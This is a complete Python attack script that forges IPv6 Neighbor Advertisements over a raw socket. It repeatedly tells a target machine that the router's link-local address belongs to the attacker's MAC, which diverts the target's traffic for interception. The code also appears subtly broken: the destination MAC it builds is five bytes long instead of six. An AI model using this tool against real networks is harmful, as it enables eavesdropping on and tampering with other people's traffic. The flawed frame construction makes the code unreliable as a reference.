#!/usr/bin/env python3
"""ndpspoof.py — tell the box "the IPv6 gateway (router LLA) lives at OUR MAC".
Usage: sudo python3 ndpspoof.py IFACE MYMAC BOX_GLOBAL_V6 ROUTER_LLA [SECONDS]"""
import socket, struct, time, sys

def csum(data):
    if len(data) % 2: data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF

def build(mymac, box6, router_ll, src_ll):
    # NA to box's solicited-node multicast MAC (ff02::1:ffXX:XXXX of box6)
    tail = box6.split(':')[-1].zfill(4)
    dmac = bytes.fromhex('3333ff' + tail[-4:])
    smac = bytes.fromhex(mymac.replace(':', ''))
    eth = dmac + smac + struct.pack('!H', 0x86DD)
    opt = struct.pack('!BB', 2, 1) + smac                      # target L2 address
    na = struct.pack('!BBBB', 136, 0, 0, 0) + struct.pack('!I', 0xE0000000)  # R+S+O
    na += socket.inet_pton(socket.AF_INET6, router_ll) + opt
    src = socket.inet_pton(socket.AF_INET6, src_ll)
    dst = socket.inet_pton(socket.AF_INET6, box6)
    ip6 = struct.pack('!IHBB', 0x60000000, len(na), 58, 255) + src + dst
    pseudo = src + dst + struct.pack('!LBB', len(na), 0, 58)
    na = na[:2] + struct.pack('!H', csum(pseudo + na)) + na[4:]
    return eth + ip6 + na

def main():
    iface, mymac, box6, router_ll = sys.argv[1:5]
    dur = float(sys.argv[5]) if len(sys.argv) > 5 else 60
    src_ll = 'fe80::1'
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x86DD))
    s.bind((iface, 0))
    pkt = build(mymac, box6, router_ll, src_ll)
    end = time.time() + dur
    while time.time() < end:
        s.send(pkt)
        time.sleep(2)

if __name__ == '__main__':
    main()
